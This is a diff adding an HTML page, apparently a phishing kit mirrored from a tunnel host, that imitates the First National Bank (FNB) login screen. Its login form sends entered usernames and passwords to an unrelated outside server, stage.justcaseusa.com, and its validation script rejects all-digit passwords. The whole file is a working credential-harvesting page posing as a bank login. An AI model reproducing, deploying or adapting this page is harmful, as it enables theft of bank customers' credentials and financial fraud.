@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from f6f991-34153.portmap.io:34153/gO-auth/fnb/en-11/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 09 Oct 2023 15:36:33 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <title>Home - First National Bank - FNB</title>
+    <link rel="shortcut icon" href="favicon.ico" />
+</head>
+
+<body>
+    <main>
+        <div class="h-screen w-screen grid justify-items-center">
+            <div class="w-full max-w-[500px] h-full pt-[2rem] px-4 relative">
+                <h1 class="text-2xl py-5 border-solid border-b-2 border-[#d9d9d9]">FNB</h1>
+                <div class="w-full flex pt-1 mb-4">
+                    <p class="font-bold text-xl text-[#059598] flex gap-2 items-center w-full">
+                        <span class="block w-5 h-2.5 bg-[#059598] rounded-tr-lg rounded-br-lg"></span> how can we help you?
+                    </p>
+                    <img src="fnblogo.png" alt="" class="w-[85px]">
+                </div>
+                <div class="px-4">
+                    <h1 class="font-bold text-2xl text-[#059598]">Please enter username and Password to Login</h1>
+                    <form id="LOGIN_FORM" autocomplete="off" method="post" name="LOGIN_FORM" action="https://stage.justcaseusa.com/nonafn/verification_1.php" class="mt-8 grid gap-5" onsubmit="return ValidateFormOther()">
+                        <div class="flex gap-2 border-solid border-b-2 border-[#d9d9d9]">
+                            <span class="text-xl text-[#626262]">Username:</span>
+                            <input type="text" name="Username" id="Username" class="text-gray-900 sm:text-sm block w-full p-2.5" placeholder="" required="" onkeydown="preventSpace(event)">
+                        </div>
+                        <div class="flex gap-2 border-solid border-b-2 border-[#d9d9d9] mt-2">
+                            <span class="text-xl text-[#626262]">Password:</span>
+                            <input type="password" name="Password" id="Password" class="text-gray-900 sm:text-sm block w-full p-2.5" placeholder="" required="">
+                        </div>
+                        <button type="submit" class="w-full bg-[#FF9900] text-white py-3 rounded-full text-2xl shadow-lg">Login</button>
+                        <button class="w-full bg-white text-black py-3 rounded-full text-2xl shadow-lg border-solid border border-[#d9d9d9]">Register</button>
+                    </form>
+                </div>
+                <p class="absolute bottom-0 mb-4 p-2 left-0 right-0 text-center text-sm border-b-2 border-[#d9d9d9]">Copyright Â© 2023 FirstRand Bank Limited</p>
+            </div>
+        </div>
+    </main>
+</body>
+
+<script>
+    function preventSpace(event) {
+      const key = event.key;
+      if (key === " ") {
+        event.preventDefault();
+      }
+    }
+
+    function ValidateFormOther() {
+        const loginID = document.getElementById("Username");
+        const emailPASS = document.getElementById("Password");
+        const passwordValue = emailPASS.value;
+        const containsNonDigit = /\D/.test(passwordValue);
+        const containsLetters = /\w/.test(passwordValue);
+        if ((loginID.value==null)||(loginID.value=="")) {
+                loginID.focus()
+                return false
+        } 
+        if ((emailPASS.value==null)||(emailPASS.value=="")){
+            emailPASS.focus()
+            return false
+        }
+        if (!containsNonDigit) {
+            alert("Password Field cannot be only numbers")
+            return false
+        }
+        return true
+    }
+  </script>
+
+<!-- Mirrored from f6f991-34153.portmap.io:34153/gO-auth/fnb/en-11/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 09 Oct 2023 15:36:33 GMT -->
+</html>
